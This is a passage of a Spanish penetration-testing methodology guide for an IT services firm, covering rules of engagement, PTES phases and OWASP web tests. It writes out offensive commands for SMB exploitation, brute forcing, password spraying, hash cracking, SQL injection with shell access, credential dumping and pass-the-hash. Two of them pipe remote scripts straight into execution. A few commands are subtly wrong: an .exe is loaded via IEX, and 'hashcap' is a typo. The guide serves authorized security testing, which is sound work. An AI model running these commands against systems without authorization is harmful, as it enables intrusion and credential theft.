---
name: penetration-testing-brida
description: >
  Metodología integral de penetration testing para BRIDA IT Services.
  Cubre PTES completo, OWASP WSTG para aplicaciones web, pentesting de red,
  wireless, ingeniería social, plantillas de reporte (ejecutivo + técnico),
  reglas de engagement, y mapeo a MITRE ATT&CK, NIST CSF y D3FEND.
  Activado por: pentest, penetration testing, ethical hacking, red team,
  explotación, vulnerabilidad, Kali Linux, Metasploit, OWASP, PTES,
  ingeniería social, wireless pentest, reporte de pentest.
domain: cybersecurity
subdomain: penetration-testing
category: offensive-security
tags:
  - pentest
  - kali-linux
  - metasploit
  - ethical-hacking
  - red-team
  - exploitation
  - owasp-wstg
  - ptes
  - wireless
  - social-engineering
  - nist-csf
  - mitre-attack
  - d3fend
  - burp-suite
  - nmap
  - reporting
mitre_attack:
  - T1046  # Network Service Scanning
  - T1059  # Command and Scripting Interpreter
  - T1071  # Application Layer Protocol
  - T1082  # System Information Discovery
  - T1083  # File and Directory Discovery
  - T1190  # Exploit Public-Facing Application
  - T1203  # Exploitation for Client Execution
  - T1133  # External Remote Services
  - T1098  # Account Manipulation
  - T1078  # Valid Accounts
  - T1566  # Phishing
  - T1557  # Adversary-in-the-Middle
  - T1548  # Abuse Elevation Control Mechanism
  - T1053  # Scheduled Task/Job
  - T1505  # Server Software Component
  - T1021  # Remote Services
  - T1003  # OS Credential Dumping
  - T1555  # Credentials from Password Stores
  - T1110  # Brute Force
  - T1055  # Process Injection
  - T1543  # Create or Modify System Process
  - T1562  # Impair Defenses
  - T1484  # Domain Policy Modification
  - T1615  # Group Policy Discovery
  - T1049  # System Network Connections Discovery
  - T1018  # Remote System Discovery
  - T1069  # Permission Groups Discovery
  - T1033  # System Owner/User Discovery
  - T1087  # Account Discovery
  - T1482  # Domain Trust Discovery
  - T1580  # Cloud Infrastructure Discovery
  - T1526  # Cloud Service Discovery
  - T1595  # Active Scanning
  - T1596  # Search Open DNS/Public Domains
  - T1593  # Search Open Websites/Domains
  - T1594  # Search Victim-Owned Websites
  - T1597  # Search Closed Sources
  - T1590  # Gather Victim Network Information
  - T1591  # Gather Victim Org Information
  - T1592  # Gather Victim Host Information
  - T1589  # Gather Victim Identity Information
  - T1585  # Establish Accounts
  - T1586  # Compromise Accounts
  - T1583  # Acquire Infrastructure
  - T1584  # Compromise Infrastructure
  - T1587  # Develop Capabilities
  - T1588  # Obtain Capabilities
  - T1608  # Stage Capabilities
  - T1210  # Exploitation of Remote Services
  - T1219  # Remote Access Software
  - T1105  # Ingress Tool Transfer
  - T1048  # Exfiltration Over Alternative Protocol
  - T1041  # Exfiltration Over C2 Channel
  - T1567  # Exfiltration Over Web Service
  - T1052  # Exfiltration Over Physical Medium
  - T1020  # Automated Exfiltration
nist_csf:
  - ID.RA-1  # Asset vulnerabilities are identified
  - ID.RA-3  # Threats, vulnerabilities, likelihoods used to determine risk
  - ID.RA-5  # Threats, vulnerabilities, likelihoods used to determine risk
  - DE.CM-01  # Network environments are monitored
  - DE.CM-09  # Computing hardware and software are monitored
  - DE.AE-02  # Potentially malicious activity is analyzed
  - DE.AE-06  # Information is correlated from multiple sources
  - PR.AC-1  # Identities and credentials are issued, managed, verified
  - PR.AC-4  # Access permissions and authorizations are managed
  - PR.AC-5  # Network integrity is protected
  - PR.DS-1  # Data-at-rest is protected
  - PR.DS-2  # Data-in-transit is protected
  - PR.IP-1  # Baseline configuration is maintained
  - PR.PT-3  # Least functionality principle is incorporated
  - RS.AN-03  # Forensic analysis is performed
  - RS.AN-05  # Incident monitoring data is collected
  - RC.RP-1  # Recovery plan is executed
d3fend:
  - D3-DA   # Dynamic Analysis
  - D3-PSA  # Process Spawn Analysis
  - D3-PSA  # Process Analysis
  - D3-FCA  # File Content Analysis
  - D3-SA   # System Analysis
  - D3-NTA  # Network Traffic Analysis
  - D3-ANA  # Authentication Analysis
  - D3-PA   # Password Analysis
  - D3-CSB  # Credential Scrubbing Behavior
  - D3-SBV  # Software Behavior Validation
  - D3-SS   # Session Analysis
  - D3-TA   # Traffic Analysis
  - D3-URA  # User Request Analysis
  - D3-WS   # Web Session Analysis
  - D3-DI   # Digital Inventory
  - D3-SAV  # Software Attribute Verification
  - D3-ISVA # Input Source Validation Analysis
  - D3-IAA  # Identifier Analysis
  - D3-DQ   # Database Query Analysis
  - D3-RPA  # Reverse Resolution of a Pointer
  - D3-DNSA # DNS Record Analysis
  - D3-HS   # Host Status Analysis
  - D3-PLA  # Platform Monitoring
  - D3-SJA  # System Call Analysis
  - D3-CE   # Configuration Enforcement
  - D3-AA   # Administrative Access Control
  - D3-MFA  # Multi-factor Authentication
  - D3-SPP  # Software Patch Protection
  - D3-NI   # Network Isolation
  - D3-FR   # Firmware Revision Verification
  - D3-WAF  # Web Application Firewall
  - D3-IDS  # Intrusion Detection System
  - D3-SIEM # Security Information and Event Management
  - D3-EAL  # Execution Allowlisting
  - D3-EDR  # Endpoint Detection and Response
  - D3-BA   # Behavioral Analysis
  - D3-CB   # Certificate-based Authentication
  - D3-KB   # Kerberos Authentication
  - D3-LM   # Local Account Monitoring
  - D3-SA   # Shared Account Monitoring
  - D3-PM   # Privilege Management
  - D3-AC   # Access Control
  - D3-AI   # Asset Inventory
  - D3-CA   # Credential Access Protection
  - D3-DB   # Data Backup
  - D3-DC   # Data Classification
  - D3-DEN  # Data Encryption
  - D3-DF   # Data Filtration
  - D3-DL   # Data Loss Prevention
  - D3-IM   # Identity Management
  - D3-LA   # Log Analysis
  - D3-MA   # Mail Analysis
  - D3-NA   # Network Analysis
  - D3-PA   # Patch Application
  - D3-RA   # Risk Assessment
  - D3-SA   # Security Assessment
  - D3-SC   # Security Configuration
  - D3-SE   # Security Education
  - D3-SR   # Security Reporting
  - D3-VA   # Vulnerability Assessment
version: '2.0'
author: BRIDA IT Services
license: Apache-2.0
language: es
---

# Penetration Testing — BRIDA IT Services v2.0

> **Stack principal:** Kali Linux 2024.x | **Estándares:** PTES, OWASP WSTG v4.2, NIST SP 800-115
> **Frameworks:** MITRE ATT&CK v15, NIST CSF 2.0, MITRE D3FEND

---

## Tabla de Contenido

1. [Cuándo Usar](#cuándo-usar)
2. [Pre-requisitos Críticos](#pre-requisitos-críticos)
3. [Reglas de Engagement (RoE)](#reglas-de-engagement-roe)
4. [Metodología PTES Completa](#metodología-ptes-completa)
5. [Pentesting de Red (Network)](#pentesting-de-red-network)
6. [Pentesting Web — OWASP WSTG](#pentesting-web--owasp-wstg)
7. [Wireless Pentesting](#wireless-pentesting)
8. [Ingeniería Social](#ingeniería-social)
9. [Stack de Herramientas Kali](#stack-de-herramientas-kali)
10. [Plantillas de Reporte](#plantillas-de-reporte)
11. [Mapeo a Frameworks](#mapeo-a-frameworks)
12. [Consideraciones Legales (México)](#consideraciones-legales-méxico)
13. [Pre-test Checklist](#pre-test-checklist)

---

## Cuándo Usar

- Post-vulnerability assessment (vulnerabilidades ya identificadas, ahora se explotan)
- Evaluación de seguridad profunda con autorización escrita
- Pre-certificación de seguridad (PCI-DSS, ISO 27001)
- Simulación de ataque real (red teaming)
- Validación de controles de seguridad existentes
- Solicitud del cliente: *"queremos saber si un atacante real puede comprometer nuestros sistemas"*
- Pruebas de cumplimiento regulatorio (CNBV, LFPDPPP)

---

## Pre-requisitos Críticos

> ⚠️ **ADVERTENCIA LEGAL:** Realizar penetration testing sin autorización escrita es un **delito federal** en México (Art. 211 bis del Código Penal Federal). BRIDA IT Services NO ejecuta pruebas sin documentación completa.

| # | Requisito | Descripción |
|---|-----------|-------------|
| 1 | **Autorización escrita** | Documento firmado por el cliente con alcance explícito (Scope of Work / SOW) |
| 2 | **Reglas de Engagement** | Documento detallando qué se puede y qué NO se puede hacer (ver sección RoE) |
| 3 | **Ventana de testing** | Fechas y horarios acordados para las pruebas |
| 4 | **Contacto de emergencia** | Persona del cliente disponible 24/7 durante el testing |
| 5 | **NDA firmado** | Acuerdo de confidencialidad mutuo |
| 6 | **Seguro de responsabilidad civil** | Cobertura vigente para el proyecto |
| 7 | **Alcance técnico definido** | IPs, dominios, aplicaciones, redes WiFi, personal en scope |
| 8 | **Manejo de datos sensibles** | Protocolo para datos personales encontrados durante el pentest |
| 9 | **Plan de rollback** | Procedimiento para restaurar sistemas si algo falla |
| 10 | **Kali Linux actualizado** | `sudo apt update && sudo apt full-upgrade -y` |

---

## Reglas de Engagement (RoE)

### Documento de Reglas de Engagement

El documento de RoE es **OBLIGATORIO** antes de iniciar cualquier prueba. Debe contener:

#### 1. Información General
```
Cliente: [Nombre del cliente]
Proyecto: [Nombre del código del proyecto]
Fecha de inicio: [DD/MM/AAAA]
Fecha de fin: [DD/MM/AAAA]
Consultor(es): [Nombres del equipo BRIDA]
```

#### 2. Alcance (Scope)

**IN Scope (dentro del alcance):**
```
- Red externa: [Rango de IPs públicas]
- Red interna: [Rango de IPs internas]
- Aplicaciones web: [URLs]
- Redes WiFi: [SSIDs]
- Ingeniería social: [Departamentos/empleados en scope]
- Physical security: [Áreas físicas]
```

**OUT of Scope (fuera del alcance):**
```
- Sistemas de producción críticos sin ventana de mantenimiento
- Denegación de servicio (DoS/DDoS) — salvo autorización explícita
- Acceso a datos personales de clientes finales
- Pruebas fuera de la ventana acordada
- Terceros/proveedores del cliente sin autorización
```

#### 3. Restricciones
```
- Horario permitido: [ej. Lun-Vie 18:00-06:00, Sáb-Dom 24h]
- Velocidad de escaneo: [ej. Throttle a 100 paquetes/seg]
- Herramientas prohibidas: [si aplica]
- Técnicas prohibidas: [ej. destrucción de datos, ransomware real]
- Credenciales proporcionadas por el cliente: [lista]
```

#### 4. Protocolo de Emergencia
```
Contacto primario BRIDA: [Nombre, teléfono, email]
Contacto de emergencia cliente: [Nombre, teléfono, email]
Criterio de detención inmediata:
  - Caída de sistema crítico de producción
  - Detección de datos personales sensibles
  - Compromiso accidental de sistema fuera de alcance
  - Cualquier situación que ponga en riesgo la operación del cliente
```

#### 5. Manejo de Información
```
- Clasificación: CONFIDENCIAL
- Almacenamiento: Disco cifrado (LUKS/Veracrypt)
- Transmisión: Canales cifrados (TLS 1.3, SFTP)
- Retención: 90 días post-entrega, luego destrucción segura
- Destrucción: shred -vfz -n 7 [archivo]
```

#### 6. Entregables
```
- Reporte ejecutivo (PDF)
- Reporte técnico (PDF + Word editable)
- Evidencias (carpeta cifrada con screenshots, logs, PCAPs)
- Presentación de hallazgos (reunión con stakeholders)
- Plan de remediación priorizado
```

---

## Metodología PTES Completa

### Fase 1: Pre-Engagement Interactions

**Objetivo:** Establecer todas las reglas, expectativas y logística antes de tocar cualquier sistema.

**Actividades:**
1. Reunión inicial con el cliente (kick-off meeting)
2. Definir y firmar el Scope of Work (SOW)
3. Firmar NDA mutuo
4. Definir Reglas de Engagement (RoE)
5. Establecer ventana de testing
6. Configurar canales de comunicación seguros (Signal, email cifrado)
7. Proporcionar credenciales de acceso (si aplica)
8. Configurar VPN o punto de acceso para pruebas remotas
9. Preparar entorno Kali Linux
10. Revisar documentación proporcionada por el cliente

**Entregables de la fase:**
- [ ] SOW firmado
- [ ] NDA firmado
- [ ] RoE documentadas y aprobadas
- [ ] Credenciales de acceso configuradas
- [ ] Entorno de trabajo listo

---

### Fase 2: Intelligence Gathering (OSINT)

#### 2.1 Reconocimiento Pasivo

**DNS Enumeration:**
```bash
# Básico
dig target.com ANY
dig target.com MX
dig target.com NS
dig target.com TXT
nslookup -type=ANY target.com

# Avanzado con dnsrecon
dnsrecon -d target.com -t std,brt,srv,axfr
dnsrecon -d target.com -D /usr/share/wordlists/dnsmap.txt -t brt

# dnsenum
dnsenum target.com --threads 10 -o dns_results.xml
```

**Subdomain Discovery:**
```bash
# Subfinder
subfinder -d target.com -o subdomains.txt

# Amass
amass enum -passive -d target.com -o amass_results.txt
amass enum -active -d target.com -brute -o amass_active.txt

# crt.sh (Certificate Transparency)
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Combinar y deduplicar
cat subdomains.txt amass_results.txt crtsh_results.txt | sort -u > all_subdomains.txt

# Verificar subdominios activos
cat all_subdomains.txt | httprobe > live_subdomains.txt
```

**Technology Fingerprinting:**
```bash
# WhatWeb
whatweb -a 3 https://target.com

# Wappalyzer (extensión de navegador)
# BuiltWith (https://builtWith.com)

# Nmap scripting
nmap -sV --script=http-headers,http-title,http-enum -p 80,443 target.com
```

**Email Harvesting:**
```bash
# theHarvester
theHarvester -d target.com -b google,bing,linkedin,twitter,duckduckgo -l 500 -f harvester_results

# Hunter.io (API)
# https://hunter.io/api-documentation
```

**OSINT Avanzado:**
```bash
# Shodan
shodan search "org:Target Company" --fields ip_str,port,os,product
shodan host [IP]

# Censys
censys search "services.tls.certificates.leaf.names: target.com"

# Google Dorking
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com ext:sql | ext:bak | ext:old | ext:log
# site:target.com intitle:"index of"
# site:target.com "password" | "usuario" | "contraseña"

# GitHub Dorking
# target.com password
# target.com API_KEY
# target.com secret
```

**Social Media OSINT:**
- LinkedIn: empleados, tecnologías, estructura organizacional
- Twitter/X: menciones técnicas, incidentes previos
- Facebook: información de instalaciones, eventos
- Instagram: fotos de oficinas (posible información de red visible)

#### 2.2 Reconocimiento Activo

**Port Scanning con Nmap:**
```bash
# Descubrimiento de hosts
nmap -sn 192.168.1.0/24 -oA host_discovery

# Escaneo SYN rápido (top 1000 puertos)
nmap -sS -T4 --top-ports 1000 -oA syn_scan target.com

# Escaneo completo de puertos TCP
nmap -sS -p- -T4 --min-rate 1000 -oA full_tcp target.com

# Escaneo de servicios y versiones
nmap -sV -sC -O -p [puertos] -oA service_scan target.com

# Escaneo UDP (top 100)
nmap -sU --top-ports 100 -T4 -oA udp_scan target.com

# Escaneo de vulnerabilidades
nmap --script vuln -p [puertos] -oA vuln_scan target.com

# Escaneo agresivo (todo en uno)
nmap -A -T4 -p- -oA aggressive_scan target.com

# Evasión de firewall/IDS
nmap -sS -f --data-length 24 -T2 -oA stealth_scan target.com
nmap -sS -D RND:10 -T2 -oA decoy_scan target.com
```

**Service Enumeration:**
```bash
# SMB
enum4linux -a target_ip
smbclient -L //target_ip -N
smbmap -H target_ip
crackmapexec smb target_ip --shares

# SNMP
snmpwalk -v2c -c public target_ip
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt target_ip

# SMTP
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t target_ip

# FTP
nmap --script ftp-anon,ftp-bounce -p 21 target_ip

# SSH
nmap --script ssh-auth-methods,ssh-hostkey -p 22 target_ip

# HTTP/HTTPS
whatweb -a 3 http://target_ip
nikto -h http://target_ip -o nikto_results.html
```

**Web Directory Brute Force:**
```bash
# Gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,sql,zip -t 50 -o gobuster_results.txt

# ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403 -o ffuf_results.json

# Feroxbuster
feroxbuster -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 --extract-links
```

**SSL/TLS Analysis:**
```bash
# testssl.sh
testssl.sh --full https://target.com

# sslyze
sslyze --regular target.com

# Nmap SSL scripts
nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443 target_ip
```

**WAF Detection:**
```bash
wafw00f https://target.com -o waf_results.txt
```

---

### Fase 3: Threat Modeling

**Objetivo:** Identificar activos críticos, vectores de ataque y priorizar esfuerzos.

**Actividades:**
1. **Inventario de activos identificados:**
   - Servidores (IP, SO, servicios)
   - Aplicaciones web (tecnología, funcionalidad)
   - Infraestructura de red (firewalls, routers, switches)
   - Usuarios y roles identificados
   - Datos sensibles potenciales

2. **Identificación de vectores de ataque:**
   - Externos: servicios expuestos, aplicaciones web, VPN, email
   - Internos: Active Directory, SMB, credenciales débiles, segmentación
   - Humanos: phishing, ingeniería social, pretexting
   - Físicos: acceso a instalaciones, tailgating, dumpster diving

3. **Mapeo a MITRE ATT&CK:**
   - Mapear cada vector de ataque a tácticas y técnicas ATT&CK
   - Priorizar por probabilidad de éxito e impacto
   - Crear matriz de ataque

4. **Matriz de riesgo:**
   ```
   | Vector | Probabilidad | Impacto | Riesgo | Prioridad |
   |--------|-------------|---------|--------|-----------|
   | SQLi en app web | Alta | Crítico | Crítico | 1 |
   | Credenciales débiles AD | Alta | Alto | Alto | 2 |
   | WiFi WPA2-Enterprise | Media | Alto | Alto | 3 |
   | Phishing | Alta | Medio | Medio | 4 |
   ```

---

### Fase 4: Vulnerability Analysis

**Escaneo Automatizado:**
```bash
# OpenVAS (Greenbone)
# Configurar target y ejecutar escaneo completo desde la interfaz web

# Nmap NSE vulnerability scripts
nmap --script vuln -p [puertos] target_ip -oA nse_vuln

# Nikto para servidores web
nikto -h https://target.com -Tuning 123bde -o nikto_full.html

# Nuclei (escaneo basado en templates)
nuclei -u https://target.com -t nuclei-templates/ -severity critical,high -o nuclei_results.txt
```

**Análisis Manual:**
- Verificación de falsos positivos del escaneo automatizado
- Pruebas manuales de lógica de negocio
- Revisión de configuraciones inseguras
- Análisis de código fuente (si está en scope)

**CVSS Scoring:**
- Usar CVSS v3.1 Calculator (https://www.first.org/cvss/calculator/3.1)
- Documentar vector string completo para cada vulnerabilidad
- Clasificar: Crítico (9.0-10.0), Alto (7.0-8.9), Medio (4.0-6.9), Bajo (0.1-3.9), Informativo (0.0)

---

### Fase 5: Exploitation

> ⚠️ **PRECAUCIÓN:** Cada intento de explotación debe ser documentado. Tener cuidado con exploits que puedan causar denegación de servicio.

**Explotación con Metasploit:**
```bash
# Iniciar Metasploit
msfconsole

# Búsqueda de exploits
search type:exploit platform:windows name:eternalblue

# Configuración básica
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST attacker_ip
set LPORT 4444
show options
exploit

# Post-explotación
sysinfo
getuid
hashdump
```

**Password Attacks:**
```bash
# Hydra — Brute force de servicios
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target_ip -t 4
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target_ip
hydra -L users.txt -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" target_ip

# Medusa
medusa -h target_ip -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# CrackMapExec (SMB/WinRM/LDAP)
crackmapexec smb target_ip -u users.txt -p passwords.txt --shares
crackmapexec smb target_ip -u admin -p 'Password123' --sam
crackmapexec winrm target_ip -u admin -p 'Password123'

# Password Spraying
crackmapexec smb target_ip -u users.txt -p 'Summer2024!' --continue-on-success
```

**Cracking de Hashes:**
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes_nt.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hashes.txt

# Hashcat
# NTLM
hashcat -m 1000 hashes_nt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NTLMv2
hashcat -m 5600 hashes_ntlmv2.txt /usr/share/wordlists/rockyou.txt

# WPA/WPA2
hashcap -m 22000 hashes_wpa.hc22000 /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hashes_bcrypt.txt /usr/share/wordlists/rockyou.txt

# MD5
hashcat -m 0 hashes_md5.txt /usr/share/wordlists/rockyou.txt
```

**Identificación de tipo de hash:**
```bash
hashid 'hash_value'
hashcat --identify hash_value
```

**Web Exploitation:**
```bash
# SQLmap
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" --batch -D database --tables
sqlmap -u "https://target.com/page?id=1" --batch -D database -T users --dump
sqlmap -u "https://target.com/page?id=1" --batch --os-shell
sqlmap -u "https://target.com/page?id=1" --forms --batch --crawl=3

# XSS (manual con Burp Suite)
# LFI/RFI (manual)
# SSRF (manual)
# Command Injection (manual)
```

---

### Fase 6: Post-Exploitation

**Privilege Escalation — Linux:**
```bash
# LinPEAS (automático)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
sudo -l
find / -perm -4000 -type f 2>/dev/null  # SUID binaries
cat /etc/crontab
cat /etc/passwd
uname -a  # Kernel version for kernel exploits
dpkg -l   # Installed packages

# GTFOBins (https://gtfobins.github.io/)
# Buscar binarios con permisos especiales que permitan escalamiento
```

**Privilege Escalation — Windows:**
```bash
# WinPEAS
winpeas.exe
# o desde memoria
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winpeas.exe')"

# Manual checks
whoami /priv
systeminfo
net user
net localgroup administrators
tasklist /svc
wmic qfe list  # Installed patches

# Token Impersonation
# PrintSpoofer, Potato exploits, etc.
```

**Active Directory Enumeration:**
```bash
# BloodHound
bloodhound-python -d domain.local -u user -p password -ns dc_ip -c all
# Importar datos a BloodHound GUI y analizar rutas de ataque

# CrackMapExec
crackmapexec ldap dc_ip -u user -p password --users
crackmapexec ldap dc_ip -u user -p password --groups
crackmapexec ldap dc_ip -u user -p password --computers

# Impacket
GetADUsers.py domain.local/user:password -dc-ip dc_ip
GetUserSPNs.py domain.local/user:password -dc-ip dc_ip -request  # Kerberoasting
secretsdump.py domain.local/user:password@dc_ip
psexec.py domain.local/user@dc_ip
wmiexec.py domain.local/user@dc_ip
```

**Lateral Movement:**
```bash
# Pass-the-Hash
crackmapexec smb target_range -u admin -H [NTLM hash] --shares

# Pass-the-Ticket (Kerberos)
impacket-getTGT domain.local/user -dc-ip dc_ip -hashes :[NTLM hash]
export KRB5CCNAME=user.ccache
impacket-psexec domain.local/user@target -k -noauth

# RDP
xfreerdp /v:target_ip /u:admin /p:password /dynamic-resolution +clipboard

# SSH pivoting
ssh -D 1080 user@pivot_host
proxychains crackmapexec smb internal_target -u admin -p password
```

**Persistence (solo si está en scope):**
```bash
# Linux
# Cron jobs
# SSH keys
# Backdoor users
# Systemd services

# Windows
# Scheduled tasks
# Registry run keys
# WMI event subscriptions
# DLL hijacking
# Golden Ticket (AD)
```

**Data Collection y Exfiltration (simulada):**
```bash
# Documentar qué datos son accesibles
# NO extraer datos reales de clientes
# Simular exfiltración con archivos de prueba
# Documentar rutas de exfiltración potenciales
```

---

### Fase 7: Reporting

Ver sección de [Plantillas de Reporte](#plantillas-de-reporte) para detalles completos.

---

### Fase 8: Clean-up

**OBLIGATORIO:** Restaurar el entorno a su estado original.

```bash
# Eliminar herramientas instaladas
rm -rf /tmp/tools/
rm -rf /home/user/backdoors/

# Eliminar cuentas de prueba creadas
# Restaurar archivos modificados
# Eliminar scheduled tasks creadas
# Eliminar claves SSH agregadas
# Eliminar credenciales de prueba

# Documentar todos los cambios realizados
# Entregar lista de cambios al cliente
```

---

## Pentesting de Red (Network)

### Workflow de Network Pentesting

```
┌─────────────────────────────────────────────────────────────┐
│                    NETWORK PENTEST WORKFLOW                   │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  1. HOST DISCOVERY          → nmap -sn, arp-scan, netdiscover│
│           │                                                   │
│  2. PORT SCANNING           → nmap -sS, -sT, -sU             │
│           │                                                   │
│  3. SERVICE ENUMERATION     → nmap -sV, banner grabbing       │
│           │                                                   │
│  4. OS FINGERPRINTING       → nmap -O, p0f                    │
│           │                                                   │
│  5. VULNERABILITY SCANNING  → nmap NSE, OpenVAS, Nuclei       │
│           │                                                   │
│  6. EXPLOITATION            → Metasploit, manual              │
│           │                                                   │
│  7. POST-EXPLOITATION       → Privesc, lateral movement       │
│           │                                                   │
│  8. DOCUMENTATION           → Evidencias, reporte             │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### Escaneo de Red Externo

```bash
# Descubrimiento de hosts en rango público
nmap -sn 203.0.113.0/24 -oA external_host_discovery

# Escaneo de puertos en hosts vivos
nmap -sS -p- -T4 --min-rate 1000 -iL live_hosts.txt -oA external_full_tcp

# Detección de servicios
nmap -sV -sC -p [puertos_abiertos] -iL live_hosts.txt -oA external_services

# Escaneo de vulnerabilidades
nmap --script vuln -p [puertos] -iL live_hosts.txt -oA external_vulns
```

### Escaneo de Red Interno

```bash
# Descubrimiento ARP (red local)
arp-scan --interface=eth0 --localnet
netdiscover -r 192.168.1.0/24 -p

# Escaneo completo interno
nmap -sS -p- -T4 192.168.1.0/24 -oA internal_full_tcp
nmap -sU --top-ports 100 -T4 192.168.1.0/24 -oA internal_udp

# Enumeración de servicios de red
nmap -sV -sC -p 21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,464,514,636,993,995,1433,1521,2049,3306,3389,5432,5900,8080,8443 192.168.1.0/24 -oA internal_services

# Enumeración SMB/NetBIOS
nbtscan 192.168.1.0/24
enum4linux -a 192.168.1.10

# Enumeración SNMP
snmpwalk -v2c -c public 192.168.1.1
snmp-check 192.168.1.1
```

### Network Traffic Analysis

```bash
# Captura con tcpdump
tcpdump -i eth0 -w capture.pcap -c 10000
tcpdump -i eth0 port 80 -w http_capture.pcap
tcpdump -i eth0 host 192.168.1.10 -w host_capture.pcap

# Análisis con Wireshark (GUI)
wireshark capture.pcap &

# Análisis con tshark (CLI)
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
tshark -r capture.pcap -Y "dns.qry.name contains target.com"
tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" | wc -l  # SYN scan detection

# Análisis de credenciales en texto claro
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization
tshark -r capture.pcap -Y "ftp.request.command==USER || ftp.request.command==PASS"
```

### MITRE ATT&CK — Network Pentesting Mapping

| Actividad | Táctica | Técnica ATT&CK |
|-----------|---------|----------------|
| Host Discovery | Reconnaissance | T1018, T1046 |
| Port Scanning | Reconnaissance | T1046, T1595 |
| Service Enumeration | Discovery | T1046, T1007, T1016, T1082, T1083, T1033, T1069, T1087 |
| OS Fingerprinting | Discovery | T1082 |
| Vulnerability Scanning | Reconnaissance | T1595 |
| Exploitation | Initial Access | T1190, T1210, T1133 |
| Credential Dumping | Credential Access | T1003, T1555, T1110 |
| Lateral Movement | Lateral Movement | T1021, T1550, T1557 |
| Persistence | Persistence | T1053, T1505, T1543 |
| Data Exfiltration | Exfiltration | T1041, T1048, T1567 |

---

## Pentesting Web — OWASP WSTG

### OWASP Web Security Testing Guide v4.2 — Categorías de Pruebas

#### WSTG-INFO-01: Information Gathering
```bash
# Fingerprinting del servidor
whatweb -a 3 https://target.com
curl -I https://target.com
nmap -sV --script http-headers,http-title -p 80,443 target.com

# Tecnologías utilizadas
# Wappalyzer, BuiltWith, WhatWeb

# Archivos y directorios ocultos
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,jsp,html,txt,bak,sql,zip,old,log,conf,config

# Archivos robots.txt, sitemap.xml, .DS_Store, .git
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
curl https://target.com/.git/HEAD
curl https://target.com/.env

# Comentarios en código fuente
curl -s https://target.com | grep -i "password\|secret\|key\|admin\|todo\|fixme\|hack"
```

#### WSTG-INFO-02: Fingerprint Web Server
```bash
# Banner grabbing
nc -v target.com 80
HEAD / HTTP/1.1
Host: target.com

# Nmap service detection
nmap -sV -p 80,443 target.com

# HTTP methods allowed
curl -X OPTIONS https://target.com -I
nmap --script http-methods -p 80,443 target.com
```

#### WSTG-INFO-03: Analyze Error Codes
```bash
# Provocar errores
curl https://target.com/nonexistent
curl https://target.com/page?id='
curl -X INVALID https://target.com

# Analizar headers de respuesta
curl -I https://target.com
```

#### WSTG-INFO-04: Enumerate Applications
```bash
# Virtual hosts
gobuster vhost -u https://target.com -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt

# Subdominios
subfinder -d target.com

# Aplicaciones en puertos no estándar
nmap -sV -p 8080,8443,9000,3000,5000,4000 target.com
```

#### WSTG-INFO-05: Review Webpage Content
```bash
# Análisis de formularios
# Análisis de JavaScript (buscar API keys, endpoints)
# Análisis de comentarios HTML
# Análisis de metadatos
```

#### WSTG-INFO-06: Identify Entry Points
```bash
# Parámetros GET/POST
# Headers HTTP
# Cookies
# API endpoints
# File upload points
```

#### WSTG-INFO-07: Map Execution Paths
```bash
# Burp Suite Spider/Crawler
# Mapear flujos de la aplicación
# Identificar funcionalidades críticas (login, admin, payment)
```

#### WSTG-INFO-08: Fingerprint Web Application Framework
```bash
whatweb -a 3 https://target.com
# Buscar patrones específicos de frameworks
# WordPress, Drupal, Joomla, Django, Rails, Laravel, etc.
```

#### WSTG-INFO-09: Map Application Architecture
```bash
# Identificar componentes: CDN, WAF, Load Balancer, API Gateway
# Tecnologías frontend/backend
# Base de datos (inferir de errores)
```

#### WSTG-CONF-01: Test Network/Infrastructure Configuration
```bash
# Verificar puertos abiertos
nmap -sV -p- target.com

# Verificar configuraciones por defecto
# Verificar archivos de configuración expuestos
curl https://target.com/web.config
curl https://target.com/crossdomain.xml
curl https://target.com/clientaccesspolicy.xml
```

#### WSTG-CONF-02: Test Application Platform Configuration
```bash
# Verificar headers de seguridad
curl -I https://target.com | grep -i "x-frame-options\|x-content-type\|content-security-policy\|strict-transport-security\|x-xss-protection\|referrer-policy\|permissions-policy"

# Verificar métodos HTTP permitidos
nmap --script http-methods -p 80,443 target.com

# Verificar CORS
curl -H "Origin: https://evil.com" -I https://target.com/api
```

#### WSTG-CONF-03: Test File Extensions Handling
```bash
# Probar extensiones de archivo
# .php, .php5, .phtml, .inc
# .asp, .aspx, .ascx, .ashx
# .jsp, .jspx, .jsf
# .bak, .old, .tmp, .log
```

